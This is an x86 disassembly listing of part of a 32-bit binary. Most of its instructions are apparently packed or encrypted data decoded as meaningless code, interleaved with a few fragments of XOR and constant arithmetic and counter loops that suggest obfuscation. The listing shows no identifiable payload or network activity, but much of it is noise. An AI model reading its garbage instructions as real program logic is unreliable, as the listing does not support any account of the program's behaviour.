  40597a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40597b:	fild   QWORD PTR ds:0xe3c0ac7e
  405981:	and    BYTE PTR [ecx],0x18
  405984:	jmp    0x78155358
  405989:	mov    eax,0x1dfa9253
  40598e:	mov    eax,edx
  405990:	imul   bl
  405992:	fwait
  405993:	sbb    bh,BYTE PTR [ebx+0x45]
  405996:	add    edi,DWORD PTR [edx]
  405998:	dec    ecx
  405999:	adc    ch,BYTE PTR [ecx+0x4aa60d3]
  40599f:	leave  
  4059a0:	fsubr  QWORD PTR [ecx+0x4e04c44f]
  4059a6:	pop    esi
  4059a7:	gs vaddsubpd ymm1,ymm0,ymm6
  4059ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ad:	pop    ds
  4059ae:	push   cs
  4059af:	ja     0x405953
  4059b1:	sbb    bh,BYTE PTR [ebp+0x2800b7ca]
  4059b7:	test   BYTE PTR [edi-0x22],0x9d
  4059bb:	(bad)  [eax-0x58]
  4059be:	retf   
  4059bf:	rcr    BYTE PTR [ecx-0x5d],0xa4
  4059c3:	sti    
  4059c4:	and    al,0x35
  4059c6:	push   eax
  4059c7:	mov    eax,0x12c21881
  4059cc:	test   eax,0x6d52c149
  4059d1:	cmp    DWORD PTR [ecx-0x1],ebp
  4059d4:	mov    ch,0x58
  4059d6:	dec    edi
  4059d7:	scas   al,BYTE PTR es:[edi]
  4059d8:	cmp    al,0xdf
  4059da:	add    BYTE PTR [edx-0x6a8ec89b],0x2
  4059e1:	stc    
  4059e2:	push   edx
  4059e3:	cs scas al,BYTE PTR es:[edi]
  4059e5:	inc    ebx
  4059e6:	pop    edx
  4059e7:	retf   0x943c
  4059ea:	(bad)  
  4059eb:	in     al,dx
  4059ec:	mov    esp,0x9ac6bbf1
  4059f1:	mov    ah,0x23
  4059f3:	mov    cl,0xc1
  4059f5:	xor    dh,0x7e
  4059f8:	xor    eax,0xffffff86
  4059fb:	fwait
  4059fc:	mov    ch,0x87
  4059fe:	jae    0x405a35
  405a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a01:	inc    eax
  405a02:	test   BYTE PTR [edx+0x231536b4],cl
  405a08:	out    dx,al
  405a09:	or     BYTE PTR [eax-0x3b],0x7f
  405a0d:	jbe    0x405a4b
  405a0f:	ja     0x405a61
  405a11:	fstp   DWORD PTR [ebx+eax*8+0x50]
  405a15:	(bad)  
  405a16:	cwde   
  405a17:	cdq    
  405a18:	mov    ds:0x6f9ebad7,eax
  405a1d:	sub    DWORD PTR ds:0x814443b2,esp
  405a23:	inc    ecx
  405a24:	jecxz  0x405a38
  405a26:	and    bl,BYTE PTR [ebx-0xa87a22d]
  405a2c:	push   cs
  405a2d:	and    eax,0x4e990661
  405a32:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  405a39:	and    DWORD PTR ds:0x43355b,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x43366f
  405a48:	xor    DWORD PTR ds:0x433543,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433667,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43353f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43361b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43361b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43361b,ecx
  405a80:	cmp    DWORD PTR ds:0x43361b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43361b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43357b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433657,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0x554d28f4,0x46f94d43
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405acd
  405add:	jnp    0x405a9d
  405adf:	sbb    esi,DWORD PTR [ebx+0x5f6debcd]
  405ae5:	mov    al,ds:0x3bb3661a
  405aea:	add    edi,DWORD PTR [esi]
  405aec:	add    al,cl
  405aee:	fstp   DWORD PTR [edx]
  405af0:	xchg   BYTE PTR [ebx],al
  405af2:	add    esi,eax
  405af4:	adc    dl,cl
  405af6:	outs   dx,DWORD PTR ds:[esi]
  405af7:	mov    ecx,0xbecf7ff7
  405afc:	pand   mm1,mm5
  405aff:	loope  0x405b6d
  405b01:	dec    edi
  405b02:	and    DWORD PTR [ecx+0x30],ecx
  405b05:	pop    esp
  405b06:	in     al,dx
  405b07:	inc    eax
  405b08:	imul   ecx,ebx,0x1f4f0d81
  405b0e:	fistp  QWORD PTR [edx+0x29]
  405b11:	mov    DWORD PTR [eax*1-0x74849402],edi
  405b18:	in     eax,0x4e
  405b1a:	mov    ah,0xcc
  405b1c:	sbb    al,0x32
  405b1e:	jae    0x405b85
  405b20:	push   ecx
  405b21:	lock dec esi
  405b23:	add    ah,BYTE PTR [esi-0x30759297]
  405b29:	js     0x405b6d
  405b2b:	pop    ds
  405b2c:	sar    DWORD PTR [edi-0x69],cl
  405b2f:	call   0xb43d:0x2ffb2684
  405b36:	retf   0x92e7
  405b39:	mov    ebx,0xa1cc56e5
  405b3e:	lea    edx,[ebx+0x12]
  405b41:	pushf  
  405b42:	enter  0xd2f6,0xd9
  405b46:	outs   dx,BYTE PTR ds:[esi]
  405b47:	sub    BYTE PTR [ebx],cl
  405b49:	mov    ebx,0x68114ff2
  405b4e:	hlt    
  405b4f:	or     DWORD PTR [ecx+0x1b382953],edi
  405b55:	data16 mov dl,0xf4
  405b58:	xor    al,BYTE PTR [esi-0x6b0deea5]
  405b5e:	jmp    0x4368224e
  405b63:	mov    ebp,0xaed15b44
  405b68:	stos   BYTE PTR es:[edi],al
  405b69:	and    DWORD PTR [edi-0x62],eax
  405b6c:	push   es
  405b6d:	sbb    eax,0x47c395ba
  405b72:	cmp    ebx,DWORD PTR ds:0xfcfa7434
  405b78:	adc    esp,DWORD PTR [ecx+eax*8+0x4c]
  405b7c:	sbb    esi,eax
  405b7e:	jbe    0x405b26
  405b80:	mov    ds:0x7712c362,eax
  405b85:	sub    DWORD PTR [eax+0x72],ebx
  405b88:	xor    al,0xc4
  405b8a:	hlt    
  405b8b:	pop    ebx
  405b8c:	and    BYTE PTR [edx],bh
  405b8e:	ret    0x5231
  405b91:	mov    DWORD PTR [esp+esi*4-0x3e],edx
  405b95:	fsubr  QWORD PTR [ecx-0x28]
  405b98:	(bad)  
  405b99:	je     0x405be4
  405b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b9c:	cmp    eax,0x1f0ac89
  405ba1:	call   0xc09d:0x24c45d06
  405ba8:	jl     0x405b5b
  405baa:	pop    ebx
  405bab:	(bad)  
  405bac:	in     al,0x80
  405bae:	(bad)  
  405bb1:	cld    
  405bb2:	sbb    al,0x1
  405bb4:	sbb    ecx,DWORD PTR [edi+0x60]
  405bb7:	push   ss
  405bb8:	fs retf 
  405bba:	mov    ds:0x99649d59,al
  405bbf:	inc    ebp
  405bc0:	bound  edx,QWORD PTR [esi-0x32]
  405bc3:	cmp    ecx,DWORD PTR [ecx]
  405bc5:	mov    edi,0x45388b95
  405bca:	call   0x3fdc:0x51cf997
  405bd1:	dec    esi
  405bd2:	and    BYTE PTR [edi],bh
  405bd4:	data16 scas al,BYTE PTR es:[edi]
  405bd6:	add    dh,cl
  405bd8:	cmp    al,0x2b
  405bda:	sbb    al,0xee
  405bdc:	lock jbe 0x405ba2
  405bdf:	xor    DWORD PTR [edi+0x1b],ebp
  405be2:	mov    cl,0x86
  405be4:	imul   esp,ecx,0xffffffce
  405be7:	out    dx,al
  405be8:	bound  esp,QWORD PTR [edx-0x7627d344]
  405bee:	adc    BYTE PTR [edx],0x66
  405bf1:	mov    dh,0x96
  405bf3:	sub    DWORD PTR ds:0xd60717bd,ebp
  405bf9:	addr16 dec esp
  405bfb:	aaa    
  405bfc:	into   
  405bfd:	push   0xffffffa2
  405bff:	mov    ecx,DWORD PTR [edx+0x6b199ea7]
  405c05:	dec    ebx
  405c06:	xchg   DWORD PTR [edi],esi
  405c08:	enter  0xf835,0xc8
  405c0c:	sti    
  405c0d:	lods   eax,DWORD PTR ds:[esi]
  405c0e:	pop    ebp
  405c0f:	add    al,0xf9
  405c11:	ds mov esi,0xe776ce76
  405c17:	mov    bl,0xae
  405c19:	inc    esp
  405c1a:	inc    esp
  405c1b:	aas    
  405c1c:	inc    esi
  405c1d:	mov    edi,0xedcf702
  405c22:	data16 adc al,0xd9
  405c25:	push   cs
  405c26:	pop    esi
  405c27:	sti    
  405c28:	and    esp,edx
  405c2a:	xor    DWORD PTR [ebx-0x7f282a4e],edx
  405c30:	dec    esi
  405c31:	dec    esi
  405c32:	std    
  405c33:	push   edi
  405c34:	jnp    0x405ca7
  405c36:	jmp    edi
  405c38:	push   0x57
  405c3a:	mov    bl,0x78
  405c3c:	loop   0x405c8c
  405c3e:	inc    esi
  405c3f:	push   ss
  405c40:	pop    esp
  405c41:	jmp    0xae111fb7
  405c46:	(bad)  
  405c47:	pop    eax
  405c48:	push   es
  405c49:	test   eax,0x475d1e30
  405c4e:	rcr    DWORD PTR [esi+ebx*1-0x58],1
  405c52:	jnp    0x405cce
  405c54:	xchg   ebp,eax
  405c55:	pop    esp
  405c56:	push   ss
  405c57:	xchg   DWORD PTR [edx+0x5f55d0ed],esi
  405c5d:	xchg   edi,eax
  405c5e:	sub    ch,ch
  405c60:	repz enter 0x4718,0xd7
  405c65:	fld    QWORD PTR [eax+esi*4]
  405c68:	and    ah,BYTE PTR [ebx+0x28487b2a]
  405c6e:	push   esi
  405c6f:	sub    eax,0xe5af8786
  405c74:	call   0x13e5833d
  405c79:	jb     0x405c8e
  405c7b:	xor    BYTE PTR [ebx-0x75],bl
  405c7e:	out    0x65,eax
  405c80:	jne    0x405c4e
  405c82:	jmp    0x8c6216df
  405c87:	fs adc eax,0x7cfaf8dc
  405c8d:	cmp    cl,BYTE PTR [ecx+ebp*1]
  405c90:	push   ebp
  405c91:	mov    ss,WORD PTR [ebx+edi*2-0x3b4b5322]
  405c98:	adc    eax,0x24362ea7
  405c9d:	mov    dl,0x1c
  405c9f:	mov    dl,0x12
  405ca1:	jl     0x405caf
  405ca3:	fistp  QWORD PTR [ecx]
  405ca5:	int3   
  405ca6:	sub    esp,DWORD PTR [edx+0x26]
  405ca9:	fwait
  405caa:	adc    al,0xbc
  405cac:	xor    DWORD PTR [esi],esi
  405cae:	add    DWORD PTR [eax+0x1edf99ed],ebx
  405cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cb5:	js     0x405cb9
  405cb7:	(bad)  
  405cb8:	and    ebx,edx
  405cba:	out    dx,eax
  405cbb:	adc    ecx,eax
  405cbd:	push   0x1054d5ee
  405cc2:	out    dx,eax
  405cc3:	in     eax,0x2d
  405cc5:	pop    eax
  405cc6:	(bad)  
  405cc7:	cld    
  405cc8:	pop    ecx
  405cc9:	test   eax,0xd7e3f5be
  405cce:	ja     0x405c67
  405cd0:	call   0x5a0c0734
  405cd5:	adc    DWORD PTR [eax],ebp
  405cd7:	je     0x405d1e
  405cd9:	and    BYTE PTR [edx-0x1aca8020],dl
  405cdf:	adc    al,0x92
  405ce1:	or     bl,BYTE PTR [eax]
  405ce3:	aas    
  405ce4:	pusha  
  405ce5:	in     eax,dx
  405ce6:	mov    eax,ds:0x56e52a51
  405ceb:	xchg   edx,eax
  405cec:	sar    eax,0x7d
  405cef:	xchg   edi,eax
  405cf0:	stc    
  405cf1:	(bad)  
  405cf2:	mov    esi,edx
  405cf4:	(bad)  
  405cf5:	sahf   
  405cf6:	adc    DWORD PTR [edi+0x27],0x96a2e8c2
  405cfd:	(bad)  
  405cfe:	fnsave [ebp+0x2e]
  405d01:	out    dx,eax
  405d02:	or     eax,0x8d231194
  405d07:	pop    edi
  405d08:	mov    ch,0x98
  405d0a:	cmp    BYTE PTR [edi-0x792564e2],bl
  405d10:	fcom   QWORD PTR [esi+eax*8-0x2d]
  405d14:	add    al,0x83
  405d16:	test   DWORD PTR [ebx],0xd7c80071
  405d1c:	mov    bl,0x6
  405d1e:	mov    bl,0xf1
  405d20:	jmp    0x405cf7
  405d22:	or     ah,BYTE PTR [edx-0x1a7da3ac]
  405d28:	push   es
  405d29:	rcl    DWORD PTR [esp+eax*8+0x4676acf9],cl
  405d30:	xchg   edi,eax
  405d31:	idiv   BYTE PTR [ebx+0xe4ee46]
  405d37:	add    BYTE PTR [edi-0x511d9c5],0x30
  405d3e:	adc    BYTE PTR [esi+0x70],al
  405d41:	adc    BYTE PTR [edx-0x292f3510],ah
  405d47:	jmp    0xce2c4b74
  405d4c:	call   0xef8fc4cf
  405d51:	sub    al,0xe
  405d53:	push   eax
  405d54:	mul    edi
  405d56:	mov    eax,ds:0xb62f7beb
  405d5b:	mov    dl,0x7e
  405d5d:	sahf   
  405d5e:	xchg   edi,eax
  405d5f:	xor    bl,BYTE PTR [ecx]
  405d61:	and    ecx,ebx
  405d63:	sub    ebx,DWORD PTR [ebx-0xa]
  405d66:	or     ecx,ecx
  405d68:	mov    DWORD PTR [edx-0x33],esi
  405d6b:	nop
  405d6c:	adc    BYTE PTR [esp+ecx*8-0x5debd308],cl
  405d73:	push   ss
  405d74:	jl     0x405dd5
  405d76:	xchg   DWORD PTR [edx-0x7c],edx
  405d79:	add    BYTE PTR [esi-0x1e],bl
  405d7c:	xor    BYTE PTR [eax],al
  405d7e:	dec    edi
  405d7f:	and    DWORD PTR gs:[esp+edx*4],edx
  405d83:	(bad)  
  405d84:	(bad)  
  405d85:	out    dx,eax
  405d86:	sbb    DWORD PTR [ecx+ebp*2-0x51],ebx
  405d8a:	popf   
  405d8b:	dec    di
  405d8d:	mov    bl,0x92
  405d8f:	dec    esp
  405d90:	(bad)  
  405d91:	and    dl,ch
  405d93:	daa    
  405d94:	sar    DWORD PTR [edx],1
  405d96:	xchg   ebx,ebp
  405d98:	cmp    eax,0x877175b4
  405d9d:	inc    edx
  405d9e:	imul   eax,DWORD PTR [esi+esi*8+0x1ce09220],0x57
  405da6:	daa    
  405da7:	push   0x9da75926
  405dac:	arpl   WORD PTR [eax+0x4edb242d],dx
  405db2:	sub    DWORD PTR [ebp-0x10],0x3a5131d1
  405db9:	adc    cl,BYTE PTR [eax-0x22]
  405dbc:	sub    DWORD PTR ds:[edi],edi
  405dbf:	lds    edi,FWORD PTR [esi+0x4daa8eb8]
  405dc5:	fsub   DWORD PTR [esi]
  405dc8:	xchg   BYTE PTR [ebp+0x1c],dh
  405dcb:	cmp    eax,0x54e11921
  405dd0:	xor    eax,0x2097239f
  405dd5:	jno    0x405dce
  405dd7:	(bad)  [ecx+0x39e4596d]
  405ddd:	ds push esi
  405ddf:	out    dx,al
  405de0:	(bad)  
  405de1:	fs push edx
  405de3:	sbb    al,0x55
  405de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405de6:	mov    ebx,0x9e39bd90
  405deb:	mov    dh,0x9c
  405ded:	cwde   
  405dee:	push   es
  405def:	gs push esi
  405df1:	cmp    al,dh
  405df3:	mov    esi,0xbf028a8e
  405df8:	icebp  
  405df9:	push   ebp
  405dfa:	pushf  
  405dfb:	call   0x9aaa7c07
  405e00:	inc    edx
  405e01:	aaa    
  405e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e03:	fs push 0xffffffbd
  405e06:	xor    cl,BYTE PTR [edx+0x692c0611]
  405e0c:	pop    esp
  405e0d:	sbb    ebx,DWORD PTR ds:0x1ed89be0
  405e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e14:	hlt    
  405e15:	add    DWORD PTR [edi+0x2e],ebp
  405e18:	das    
  405e19:	cmp    esi,eax
  405e1b:	loop   0x405dfa
  405e1d:	pop    esi
  405e1e:	test   al,al
  405e20:	retf   
  405e21:	clc    
  405e22:	mov    esi,0xf59327f9
  405e27:	clc    
  405e28:	imul   esp,DWORD PTR [ebp-0x3e],0xffffffab
  405e2c:	arpl   WORD PTR [eax-0x5c407c24],di
  405e32:	dec    esi
  405e33:	add    ebp,DWORD PTR [ebx-0x55]
  405e36:	int3   
  405e37:	fimul  DWORD PTR [ecx+0x64]
  405e3a:	push   0x44277358
  405e3f:	pop    esi
  405e40:	mov    dl,ch
  405e42:	outs   dx,DWORD PTR ds:[esi]
  405e43:	ret    0xdd5
  405e46:	aas    
  405e47:	scas   eax,DWORD PTR es:[edi]
  405e48:	pop    edx
  405e49:	xchg   esp,eax
  405e4a:	ds inc ebx
  405e4c:	hlt    
  405e4d:	mov    esp,DWORD PTR [esi]
  405e4f:	cmp    al,0xf6
  405e51:	and    ebp,DWORD PTR [eax]
  405e53:	adc    eax,0x839ddc9f
  405e58:	mov    WORD PTR [ecx+0x6c],?
  405e5b:	mov    esp,0x6c0ca188
  405e60:	cmp    dh,BYTE PTR [esi+0x65]
  405e63:	pop    es
  405e64:	and    cl,BYTE PTR [ebx-0x3b]
  405e67:	sbb    esp,DWORD PTR [edi+edx*1]
  405e6a:	cwde   
  405e6b:	cmp    ch,BYTE PTR [eax-0x43]
  405e6e:	adc    DWORD PTR [esi+0x2e314175],eax
  405e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e75:	push   ebx
  405e76:	ucomiss xmm4,xmm1
  405e79:	jl     0x405e41
  405e7b:	pop    edx
  405e7c:	aas    
  405e7d:	pusha  
  405e7e:	mov    dl,0x85
  405e80:	(bad)  
  405e81:	xchg   edi,eax
  405e82:	inc    ebp
  405e83:	mov    ecx,0x2da593f5
  405e88:	test   al,0x6d
  405e8a:	add    BYTE PTR [edi],cl
  405e8c:	mov    ds:0xb8fc6efd,eax
  405e91:	xor    edi,DWORD PTR [ebx+eax*1-0x3f]
  405e95:	imul   eax,esi
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x3581ddb5
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	shr    DWORD PTR [eax-0x7040608e],cl
  405ee8:	or     eax,0x1d3e9a0f
  405eed:	sub    eax,0x2b852ad5
  405ef2:	push   0x350457d9
  405ef7:	add    DWORD PTR [ecx-0x22fec1fd],0x2b
  405efe:	sbb    ebp,DWORD PTR [ebx+edx*2+0x48f1af02]
  405f05:	push   0xffffffd0
  405f07:	push   0xd8879cbc
  405f0c:	lds    ebx,FWORD PTR [eax+ecx*1-0x2]
  405f10:	pop    esp
  405f11:	dec    ebp
  405f12:	lahf   
  405f13:	pop    ds
  405f14:	cmp    eax,0xdda12c8f
  405f19:	cmp    eax,0x785bfc18
  405f1e:	or     DWORD PTR [edx-0x47aaef7a],edi
  405f24:	cld    
  405f25:	mov    eax,ds:0x4379bd0b
  405f2a:	sbb    eax,0xf92e40d5
  405f2f:	retf   
  405f30:	xchg   ecx,eax
  405f31:	sbb    ecx,DWORD PTR [ecx]
  405f33:	sub    BYTE PTR [esi],cl
  405f35:	push   cs
  405f36:	push   cs
  405f37:	mov    edi,0xba8dea08
  405f3c:	pop    ds
  405f3d:	pop    esi
  405f3e:	(bad)
  405f41:	mov    cl,BYTE PTR [ebx]
  405f43:	sub    DWORD PTR [edi-0x6e],ebx
  405f46:	cdq    
  405f47:	jo     0x405f37
  405f49:	mov    al,0xf
  405f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f4c:	test   eax,0x40d698b8
  405f51:	sub    al,0xcb
  405f53:	sub    DWORD PTR [esi+ebx*1],ebx
  405f56:	mov    edx,0xf2816641
  405f5b:	jge    0x405f67
  405f5d:	jg     0x405f72
  405f5f:	icebp  
  405f60:	ret    
  405f61:	mov    esp,0x1f913173
  405f66:	(bad)  
  405f68:	push   esi
  405f69:	and    esp,DWORD PTR [ebx+0x14a1168c]
  405f6f:	pop    ebp
  405f70:	pop    es
  405f71:	out    0x2a,eax
  405f73:	ja     0x405f6b
  405f75:	(bad)  [ebp-0xee4cd05]
  405f7b:	adc    BYTE PTR [esi],dh
  405f7d:	aad    0xc
  405f7f:	mov    esp,0x59d14705
  405f84:	js     0x405fdb
  405f86:	cli    
  405f87:	jne    0x405f98
  405f89:	fld    DWORD PTR [edx]
  405f8b:	mov    al,ds:0x2673a342
  405f90:	pop    ebx
  405f91:	jne    0x405f4c
  405f93:	mov    ?,esi
  405f95:	test   DWORD PTR [edi],ebx
  405f97:	pop    eax
  405f98:	stos   DWORD PTR es:[edi],eax
  405f99:	jecxz  0x405fd7
  405f9b:	out    0x2d,al
  405f9d:	je     0x405fa7
  405f9f:	punpckldq mm4,mm2
  405fa2:	sub    eax,0x72de6378
  405fa7:	sbb    eax,0xcb4187a4
  405fac:	jae    0x405fc2
  405fae:	cmp    esi,DWORD PTR [ebp+0x26]
  405fb1:	cmp    al,BYTE PTR [edx+eiz*4]
  405fb4:	inc    edx
  405fb5:	mov    bh,dl
  405fb7:	pop    edi
  405fb8:	lahf   
  405fb9:	dec    esi
  405fba:	adc    BYTE PTR [esi+0x78],cl
  405fbd:	add    al,0x7d
  405fbf:	js     0x405fd7
  405fc1:	mov    ch,0xa2
  405fc3:	pop    ss
  405fc4:	loopne 0x405f93
  405fc6:	cmc    
  405fc7:	inc    esp
  405fc8:	sti    
  405fc9:	xchg   ecx,eax
  405fca:	daa    
  405fcb:	mov    esp,0xdae3826f
  405fd0:	cmc    
  405fd1:	and    bh,bh
  405fd3:	jge    0x405f87
  405fd5:	loopne 0x405fbe
  405fd7:	les    ecx,FWORD PTR es:[bp-0x66]
  405fdc:	sbb    al,BYTE PTR [ecx-0x60]
  405fdf:	or     BYTE PTR [eax],0x5
  405fe2:	jmp    0x823acb24
  405fe7:	push   ss
  405fe8:	repz aaa 
  405fea:	xchg   ebp,eax
  405feb:	pop    ebp
  405fec:	push   ebx
  405fed:	bound  eax,QWORD PTR [edx]
  405fef:	sbb    edi,edi
  405ff1:	sub    al,0x30
  405ff3:	and    BYTE PTR [esi+0x11a7598f],dl
  405ff9:	stos   BYTE PTR es:[edi],al
  405ffa:	js     0x405fa4
  405ffc:	adc    eax,esi
  405ffe:	cmp    eax,DWORD PTR [ebx-0x2db8b47f]
  406004:	and    DWORD PTR [eax+eax*1],edx
  406007:	fdivr  QWORD PTR [esp+ebx*1+0x59b707dd]
  40600e:	push   esi
  40600f:	and    al,0x82
  406011:	call   0xf2d3:0xa6bd4453
  406018:	(bad)  
  406019:	pusha  
  40601a:	loope  0x40605c
  40601c:	add    esp,DWORD PTR [ecx]
  40601e:	(bad)  
  40601f:	nop
  406020:	aaa    
  406021:	fbld   TBYTE PTR [ebx+0x5eb01529]
  406027:	shr    DWORD PTR [ebx+0xb],cl
  40602a:	in     eax,dx
  40602b:	outs   dx,BYTE PTR ds:[esi]
  40602c:	mov    esi,?
  40602e:	push   0x5e
  406030:	add    dh,bh
  406032:	push   ss
  406033:	or     cl,cl
  406035:	pop    esp
  406036:	jg     0x405fe4
  406038:	repnz in al,0xac
  40603b:	stc    
  40603c:	mov    al,0x95
  40603e:	adc    DWORD PTR [edi],eax
  406040:	push   0xffffffeb
  406042:	gs (bad) 
  406044:	retf   0x4a5d
  406047:	neg    DWORD PTR [esi+ebp*2]
  40604a:	mov    WORD PTR [esi+0x31],ds
  40604d:	clc    
  40604e:	xlat   BYTE PTR ds:[ebx]
  40604f:	fisttp WORD PTR [edi-0x259f75ec]
  406055:	xor    dh,BYTE PTR [esi-0x68]
  406058:	push   ebx
  406059:	push   edi
  40605a:	in     eax,dx
  40605b:	aad    0x37
  40605d:	fist   WORD PTR [ecx+0x7d]
  406060:	xlat   BYTE PTR ds:[ebx]
  406061:	js     0x4060d0
  406063:	jno    0x4060bf
  406065:	mov    esi,0xb5612f9c
  40606a:	icebp  
  40606b:	jle    0x406090
  40606d:	cmp    al,0xdc
  40606f:	scas   eax,DWORD PTR es:[edi]
  406070:	stos   DWORD PTR es:[edi],eax
  406071:	sbb    edx,DWORD PTR [edx]
  406073:	push   ebx
  406074:	out    dx,al
  406075:	in     al,0xc0
  406077:	inc    edi
  406078:	mov    cl,0x4c
  40607a:	pop    eax
  40607b:	pop    esp
  40607c:	fs mov dh,0xfd
  40607f:	cmp    DWORD PTR [esi],0xffffffd3
  406082:	add    ah,BYTE PTR [ecx+0x546afca9]
  406088:	mov    eax,ds:0x5d9e66
  40608d:	mov    eax,ebx
  40608f:	pop    ebp
  406090:	xchg   esp,eax
  406091:	cmp    eax,0x94652822
  406096:	das    
  406097:	mov    bl,0x20
  406099:	add    eax,0x1c82e344
  40609e:	in     al,0xfd
  4060a0:	sub    ebx,DWORD PTR [ecx+0x1080050d]
  4060a6:	(bad)  
  4060a7:	push   esp
  4060a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060a9:	je     0x406082
  4060ab:	not    BYTE PTR [ebx]
  4060ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060af:	enter  0x4f5f,0x39
  4060b3:	ret    
  4060b4:	sbb    edx,DWORD PTR [esi]
  4060b6:	cmp    DWORD PTR [ecx+esi*8],edx
  4060b9:	lahf   
  4060ba:	jno    0x406051
  4060bc:	pop    ebx
  4060bd:	mov    esi,0x4dd8b7f
  4060c2:	fcmovnu st,st(5)
  4060c4:	fild   WORD PTR [edi]
  4060c6:	rol    DWORD PTR [ecx],cl
  4060c8:	stc    
  4060c9:	rcr    dh,cl
  4060cb:	cwde   
  4060cc:	ins    BYTE PTR es:[edi],dx
  4060cd:	jmp    DWORD PTR [esi+0xa]
  4060d0:	sub    eax,0xaa69b009
  4060d5:	das    
  4060d6:	dec    ebx
  4060d7:	call   esp
  4060d9:	cmp    DWORD PTR [esi-0x2c],ecx
  4060dc:	ins    DWORD PTR es:[edi],dx
  4060dd:	xchg   ecx,eax
  4060de:	(bad)  
  4060e0:	(bad)  
  4060e1:	jmp    0x4060cd
  4060e3:	mov    ebx,0x9809271e
  4060e8:	jl     0x4060a2
  4060ea:	sbb    ebp,edi
  4060ec:	outs   dx,DWORD PTR ds:[esi]
  4060ed:	inc    eax
  4060ee:	dec    esi
  4060ef:	mov    ecx,0x8f3365ff
  4060f4:	sahf   
  4060f5:	shl    esi,0xfd
  4060f8:	pop    edi
  4060f9:	js     0x406155
  4060fb:	stc    
  4060fc:	add    eax,0xb466b158
  406101:	sbb    eax,0x8a5d23a6
  406106:	xchg   ebx,eax
  406107:	xor    ch,BYTE PTR [esi+0x1ca75849]
  40610d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40610e:	pop    es
  40610f:	push   cs
  406110:	mov    ss,WORD PTR [ebx+0x4517a9e9]
  406116:	aaa    
  406117:	test   DWORD PTR [edx+0x4e],esp
  40611a:	mov    ebx,0x9d6429de
  40611f:	retf   
  406120:	shl    esi,0x75
  406123:	push   esi
  406124:	add    al,0x24
  406126:	dec    edx
  406127:	lds    edi,FWORD PTR [eax-0x67941f7f]
  40612d:	ds inc eax
  40612f:	push   esi
  406130:	sbb    al,0xb8
  406132:	fwait
  406133:	push   0xffffff8b
  406135:	jns    0x4060f4
  406137:	stos   BYTE PTR es:[edi],al
  406138:	fld    DWORD PTR [ecx-0x1067723c]
  40613e:	aaa    
  40613f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406140:	retf   0xda9c
  406143:	xchg   ebx,eax
  406144:	mov    esi,DWORD PTR [ebx]
  406146:	add    eax,0x3032253b
  40614b:	rol    BYTE PTR [ebx+ebx*4-0x59],0x0
  406150:	or     BYTE PTR [ecx+ebp*4+0x5d6f4d9a],al
  406157:	push   0x8f5e3ecb
  40615c:	ja     0x4060ec
  40615e:	addr16 dec esp
  406160:	sti    
  406161:	xor    BYTE PTR [ecx+0x5],dl
  406164:	sbb    BYTE PTR [eax-0x19],0x5b
  406168:	jmp    0x14e7:0xf0e3a10
  40616f:	lea    ebx,[edx]
  406171:	repz sub al,0x84
  406174:	call   0x5415:0x80cbe7bf
  40617b:	add    esp,0x4e
  40617e:	sahf   
  40617f:	mov    ds:0xed18eecd,al
  406184:	sub    eax,0xd46dcb31
